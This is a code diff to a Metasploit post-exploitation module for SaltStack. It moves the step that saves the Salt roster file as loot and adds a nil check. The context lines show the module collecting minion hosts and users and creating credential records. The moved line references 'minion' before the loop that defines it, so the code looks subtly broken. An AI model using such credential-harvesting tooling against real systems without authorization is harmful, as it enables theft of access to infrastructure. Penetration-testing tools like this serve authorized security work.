@@ -219,6 +219,10 @@ class MetasploitModule < Msf::Post
         print_error("Unable to load #{config}")
         next
       end
+      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
+      print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
+      next if minions.nil?
+
       minions.each do |name, minion|
         host = minion['host'] # aka ip
         user = minion['user']
@@ -283,8 +287,6 @@ class MetasploitModule < Msf::Post
         cred[:private_data] = input
         create_credential_and_login(cred)
       end
-      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
-      print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
     end
     gather_pillars
   end
